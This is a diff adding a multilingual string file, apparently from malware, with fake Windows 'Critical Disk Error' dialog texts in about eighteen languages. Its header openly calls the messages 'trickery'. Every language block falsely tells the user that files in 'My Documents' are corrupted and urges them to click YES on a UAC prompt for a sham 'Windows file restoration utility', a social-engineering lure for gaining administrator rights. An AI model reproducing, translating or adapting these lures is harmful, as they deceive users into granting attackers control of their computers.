@@ -1,0 +1,265 @@
+﻿#######################################################################
+#The secret impresses no one. The trick you use it for is everything
+#
+#Format:
+# translation_begin LANG_ID
+# 0-9 in proper order, each part of the trickery
+# translation_end
+#
+# 32 entries max
+# In message #9, use * in place of a line drop (\n)
+#######################################################################
+
+#Russian
+translation_begin 25
+0=Критическая ошибка диска
+1=Операционная система обнаружила поврежденную папку на вашем жестком диске.
+2=Многочисленные поврежденные файлы обнаружены в папке My documents, что бы предотвратить потерю информации просим вас позволить системе восстановить файлы.
+3=Показать детали
+4=Больше деталей об данной ошибке
+5=Восстановить файлы
+6=Восстановить файлы и проверить диск на наличие ошибок.
+7=Вы отключили нужные привилегии для программы востановления файлов Windows, Просим вас нажать на кнопку YES в окне UAC для того что бы позволить системе восстановить поврежденные файлы.
+8=Ошибка привилегий
+9=Детали об ошибке:*Поврежденная папка: %s*Число поврежденных файлов: %d
+translation_end
+
+#Spanish
+translation_begin 10
+0=Error crítico del disco
+1=Windows ha detectado una carpeta dañada en el disco duro
+2=Multiples archivos corruptos han sido encontrados en la carpeta "Mis Documentos". Para evitar perder datos deje que Windows restaure los archivos
+3=Mostrar Detalles
+4=Mas información sobre este error
+5=Restaurar archivos
+6=Restaurar archivos y chequear el disco en busca de errores
+7=Has denegado los privilegios de Windows para la utilidad de restauración. Por favor seleccione SI en la siguiente ventana UAC para permitir que Windows restaure los archivos dañados.
+8=Error en los privilegios
+9=Detalles del error:*Carpeta corrupta: %s*Cantidad de archivos corruptos: %d
+translation_end
+
+#Portuguese
+translation_begin 22
+0=Erro de Disco Crítico
+1=O Windows encontrou uma pasta corrompida no seu disco rígido
+2=Múltiplas pastas corrompidas foram encontradas na pasta "Meus Documentos". Para prevenir uma perda de dados mais séria, por favor deixe o Windows restaura-las
+3=Mostrar detalhes
+4=Mais detalhes sobre esse erro
+5=Restaurar os arquivos
+6=Restaurar os arquivos e verificar erros no disco
+7=Você negou os privilégios adequados ao serviço de restauração de arquivos do Windows. Por favor selecione SIM no próximo prompt UAC para permitir que o Windows restaure os arquivos corrompidos.
+8=Erro de privilégio
+9=Detalhes do erro:*Pasta corrompida: %s*Número de arquivo corrompido: %d
+translation_end
+
+#German
+translation_begin 7
+0=Kritischer Festplattenfehler
+1=Windows hat einen fehlerhaften Ordner auf deiner Festplatte vorgefunden.
+2=Mehrere fehlerhafte Dateien wurden in dem Ordner 'Eigene Dokumente' gefunden. Um Datenverlust zu verhindern, erlaube Windows diese wiederherzustellen.
+3=Details anzeigen
+4=Mehr Details zu diesem Fehler
+5=Dateien wiederherstellen
+6=Dateien wiederherstellen und Festplatte auf Fehler überprüfen
+7=Sie verweigerten Windows die Privilegien, das Dateiwiederherstellungswerkzeug zu nutzen. Bitte wählen Sie, bei dem folgendem Benutzerkontensteuerungsdialog, 'JA', um Windows die Wiederherstellung, der Dateien, zu erlauben.
+8=Privilegfehler
+9=Fehlerinformationen:*Fehlerhafter Ordner: %s*Anzahl fehlerhafter Dateien: %d
+translation_end
+
+#Dutch
+translation_begin 19
+0=Kritieke foutmelding
+1=Windows heeft een beschadigde map gevonden
+2=Meerdere beschadigde bestanden zijn in de map 'Mijn Documenten' gevonden. Om dataverlies te voorkomen raden we aan om Windows toelating te geven voor het uitvoeren van een herstelprocedure.
+3=Toon details
+4=Meer details over deze foutmelding
+5=Herstel bestanden
+6=Herstel bestanden en controleer de harde schijf voor errors
+7=U heeft de nodige rechten afgewezen voor de Windows herstelprocedure. Selecteer JA op de volgende UAC prompt om Windows toelating the geven voor het herstel van beschadigde bestanden.
+8=Toestemming error
+9=Details van foutmelding: *Corrupte map: %s*Aantal beschadigde mappen: %d
+translation_end
+
+#French
+translation_begin 12
+0=Erreur Critique
+1=Windows a trouvé un dossier corrompu
+2=Plusieurs fichiers corrompu sont trouvés dans la dossier 'Mes Documents'. Donnez Windows la permission pour réparer les fichiers et pour prévenir la perte des données.
+3=Montre détails
+4=Plus de détails sur cette erreur
+5=Réparer les fichiers
+6=Répare fichiers et contrôle le disque dur
+7=Vous avez rejeté les privilèges nécessaires pour la procédure de réparation de Windows. Sélectionnez OUI sur la prochaine prompt de UAC pour permettre à Windows d'exécuter une réparation de fichiers corrompus
+8=Erreur de privilège
+9=Détails d'erreur: *Dossier corrompu: %s*Nombre de dossiers corrompus: %d
+translation_end
+
+#Hindi
+translation_begin 57
+0=गंभीर हार्ड डिस्क त्रुटि
+1=विंडोज़ को हार्ड ड्राइव पर एक भ्रष्ट फ़ोल्डर का सामना करना पड़ा है
+2=एकाधिक भ्रष्ट फ़ाइलें फ़ोल्डर 'My Documents' में पाया गया है . डेटा के गंभीर नुकसान को रोकने के लिए विंडोज़ को इन फ़ाइलों को बहाल करने की अनुमति दें 
+3=विवरण को देखें 
+4=इस त्रुटि के बारे में अधिक जानकारी
+5=फ़ाइलों को पुनर्स्थापित
+6=फ़ाइलों को पुनर्स्थापित और  त्रुटियों के लिए डिस्क की जाँच
+7=आपने  विंडोज़ फ़ाइल बहाली के उपयोगिता के लिए उचित विशेषाधिकार से इनकार किया है. कृपया निम्नलिखित UAC पर हाँ का चयन विंडोज़ के  भ्रष्ट फ़ाइलों को पुनर्स्थापित करने के लिए अनुमति दें .
+8=विशेषाधिकार त्रुटि
+9=त्रुटि विवरण: *भ्रष्ट फ़ोल्डर: %s*भ्रष्ट फ़ाइल गिनती: %d
+translation_end
+
+#Arabic
+translation_begin 1
+0=خطاء حرج في القرص
+1=وجد نظام التشغيل مجلد تالف على قرص الجهاز لصلب
+2=تم العثور على عدة ملفات معطوبة في مجلد 'مستنداتك'، لتجنب الفقدان الخطير لبياناتك، اسمح لنظام التشغل بمحاولة استعادة هذه الملفات
+3=أظهر التفاصيل
+4=معلومات اخرى عن هذا الخطاء
+5=استعادة الملفات
+6=استعادة الملفات وفحص الاخطاء على القرص الصلب
+7=لقد قمت برفض الخيارات المفضلة لنظام التشغيل من اجل استعادة الملفات، يرجى اختيار 'نعم' لمنح نظام التشغيل لاستعادة الملفات التالفة
+8=خطاء في الصلاحية
+9=تفاصيل خطاء*ملف تالف: %s*عدد الجلدات التالفة: %d
+translation_end
+
+#Farsi - Persian
+translation_begin 41
+0=خطای بحرانی دیسک
+1=ویندوز با پوشه خراب در هارد درایو مواجه شده است
+2=چند فایل خراب در پوشه ی 'پرونده های من' پیدا شده است. جهت پیشگیری از نابود شدن جدی اطلاعات ، لطفا به ویندوز اجازه ی بازیابی این فایل ها را بدهید
+3=نمایش جزئیات
+4=اطلاعات بیشتر درباره ی این خطا
+5=بازیابی فایل ها
+6=بازیابی فایل و چک کردن دیسک برای خطاها
+7=شما دسترسی کامل و لازم به ابزار بازیابی فایل ویندوز نداده اید لطفا 'اره' را در زیر کنترل حساب کاربر انتخاب کنید تا به ویندوز اجازه ی بازیابی فایل های خراب داده شود
+8=دسترسی خطا
+9=جزئیات خطا: *پوشه ی خراب: %s*شماره ی فایل خراب: %d
+translation_end
+
+#Chinese
+translation_begin 4
+0=严重磁盘错误
+1=Windows在您的硬盘上发现了一个损坏的文件夹
+2=在'我的文档'发现了多个损坏的文件。为了防止严重的数据丢失，请允许 Windows 还原这些文件
+3=显示细节
+4=关于这个错误的更多细节
+5=恢复文件
+6=恢复文件并且检测磁盘错误
+7=您拒绝了向 Windows 文件恢复实用程序提供适当的特权。请在下面的 UAC 提示选择'是’来允许Windows还原损坏的文件
+8=权限错误
+9=错误细节: *损坏的文件夹: %s*损坏的文件数量: %d
+translation_end
+
+#Turkish
+translation_begin 31
+0=Kritik disk hatası
+1=Windows sabit diskinizde bozuk bir klasör ile karşılaştı
+2='Belgelerim' dosyasinda fazla bozuk klasör bulunmuştur. Ve ciddi kaybını önlemek için, bu dosyaları geri yüklemek için Windows'a izin veriniz lütfen
+3=Detayı göster
+4=Bu hata hakkında daha fazla ayrıntı
+5=Dosyaları geri yükl
+6=Dosyaları geri yükle ve hatalar için diski kontrol et
+7=Windows dosya restorasyon programı için uygun izin verilmedi. Windows'a bozuk dosyaları geri yüklemek için izin vermek için lutfen aşağıdaki UAC EVET seçiniz.
+8=Izin hatası
+9=Hata ayrıntıları: *Bozuk klasör: %s*Bozuk dosya sayısı: %d
+translation_end
+
+#Indonesian
+translation_begin 33
+0=Kritis Disk Kesalahan
+1=Windows telah mengalami rusak folder pada hard drive Anda
+2=Beberapa file rusak telah ditemukan di folder 'My Documents'. Untuk mencegah kerugian serius data, perkenankan Windows untuk mengembalikan file-file ini.
+3=Tampilkan detail
+4=Lebih rinci tentang kesalahan ini
+5=mengembalikan file
+6=Kembalikan file dan memeriksa disk untuk kesalahan
+7=Anda menyangkal hak-hak istimewa yang tepat untuk utilitas restorasi file Windows. Silakan pilih YES pada prompt UAC berikut untuk memungkinkan Windows untuk mengembalikan file yang rusak.
+8=Privilege Kesalahan
+9=Kesalahan rincian: *Rusak folder: %s*Rusak file count: %d
+translation_end
+
+#Italian
+translation_begin 16
+0=Errore critico dell'hard disk
+1=Windows ha trovato una cartella corrotta nel vostro hard disk.
+2=Sono stati trovati numerosi file corrotti nella cartella "Documenti". Per prevenire una seria perdita di dati, consenti Windows di ripristinare questi file.
+3=Mostra dettagli
+4=Maggiori dettagli su quest'errore
+5=Ripristina i file
+6=Ripristina i file e controlla il disco per errori.
+7=Hai negato i privilegi necessari a Windows per riparare i file. Selezione "Si" nella seguente finestra per permettere a Windows di riparare i file corrotti.
+8=Errore nei privilegi
+9=Dettagli dell'errore: *Cartelle corrotte: %s*Numero di file corrotti: %d
+translation_end
+
+#Finnish
+translation_begin 11
+0=Kriittinen Levy Virhe
+1=Windows on törmännyt korruptoituneeseen kansioon kovalevyllä.
+2=Useita korruptoituneita tiedostoja on löytynyt kansiosta 'Omat Tiedostot'. Estääksesi tietojen menetyksen, ole hyvä ja salli Windowsin palauttaa tiedostot.
+3=Näytä tiedot
+4=Lisätietoja virheestä
+5=Palauta tiedostot
+6=Palauta tiedostot ja etsi virheitä kovalevystä.
+7=Et sallinut oikeuksia Windowsin tiedostojen palautus ohjelmistolle. Ole hyvä ja valitse KYLLÄ seuraavasta UAC ikkunasta sallimaan Windowsin palauttaa tiedostot.
+8=Käyttöoikeusvirhe
+9=Virheen tiedot: *Korruptoitunut kansio: %s*Korruptoituneiden tiedostojen määrä: %d
+translation_end
+
+#Polish
+translation_begin 21
+0=Problem, krytyczny stan dysku
+1=Windows znalazl korupcyjny folder w twoim twardym dysku.
+2=Duza ilosc zepsutych plikow zostala znaleziona w swoim folderze 'My Documents'. Zeby zachowac pamiec, prosze zastosowac Windowsa zeby zachowac pliki.
+3=Pokaz wiecej informacji
+4=Wiecej danych na temat bledu
+5=Przywracanie plików
+6=przywracanie plików i sprawdzanie dysku na bledy.
+7=nie może odmówić właściwych uprawnień do pliku narzędzia przywracania systemu Windows. Wybierz YES na następującym UAC, aby system Windows w celu przywrócenia uszkodzonych plików.
+8=Błąd przywileju
+9=Szczegóły błędu: *Uszkodzony Folder: %s*Uszkodzone Ilość plików: %d
+translation_end
+
+#Japanese
+translation_begin 17
+0=重大なディスクエラー
+1=Windowsは貴方のhard driveの中に不具合のfolderを発見しました。
+2='My Documents'のfolderの中に複数の不具合のファイルがあります。　Dataの消失を防ぐため、Windowsによるこれらのファイルの回復をする許可をお願いします。
+3=内容の詳細を見る。
+4=エラーの更なる詳細を見る。
+5=ファイルの修復をする。
+6=ファイルの修復とDiskにエラーがないかチェックする。
+7=Windows file restoration utilityに対する特権を行使しません。次のUACでYESを選び、Windowsで不具合のあるファイルの修復をすることを許可します。
+8=特権に関するエラー
+9=エラーの詳細: *不具合のfolder: %s*破損したファイルの数： %d
+translation_end
+
+#Vietnamese
+translation_begin 42
+0=Critical Disk Error
+1=Windows đã gặp phải một thư mục bị hỏng trên ổ đĩa cứng của bạn
+2=Nhiều tập tin bị hỏng đã được tìm thấy trong thư mục "My Documents" Để ngăn ngừa mất dữ liệu nghiêm trọng, hãy cho phép Windows để khôi phục lại những tập tin này.
+3=Hiển thị chi tiết
+4=Thêm chi tiết về lỗi này
+5=Khôi phục các tập tin
+6=Khôi phục các tập tin và kiểm tra lỗi đĩa
+7=Bạn bị từ chối quyền ưu đãi thích hợp các tiện ích Windows phục hồi tập tin chọn YES sau UAC nhắc để cho phép Windows để khôi phục lại các file bị hư hỏng.
+8=Privilege Error
+9=Chi tiết lỗi:*Hỏng thư mục: %s*Hỏng số file: %d
+translation_end
+
+#English
+translation_begin 9
+0=Critical Disk Error
+1=Windows has encountered a corrupted folder on your hard drive
+2=Multiple corrupted files have been found in the folder 'My Documents'. To prevent serious loss of data, please allow Windows to restore these files.
+3=Show details
+4=More details about this error
+5=Restore files
+6=Restore files and check disk for errors
+7=You denied the proper privileges to the Windows file restoration utility. Please select YES on the following UAC prompt to allow Windows to restore the corrupted files.
+8=Privilege Error
+9=Error details: *Corrupted folder: %s*Corrupted file count: %d
+translation_end
+
+
